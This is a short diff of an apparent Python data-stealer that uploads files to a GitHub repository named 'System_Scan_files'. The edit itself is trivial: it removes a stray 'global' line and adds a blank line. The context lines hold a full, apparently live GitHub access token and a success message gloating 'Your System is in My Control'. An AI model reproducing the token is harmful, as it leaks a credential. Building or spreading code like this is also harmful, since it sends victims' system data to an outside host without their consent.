@@ -29,7 +29,6 @@ from github import Github, InputGitTreeElement, Auth
 # -------------------------------------------------------------------
 # GITHUB CONFIGURATION
 # -------------------------------------------------------------------
-global
 GITHUB_TOKEN = "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"
 REPO_NAME = "amrita425/System_Scan_files"
 BRANCH = "main"
@@ -2073,4 +2072,5 @@ if __name__ == "__main__":
         print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
     else:
         print("\033[91mFailed to push to GitHub\033[0m")
+
 
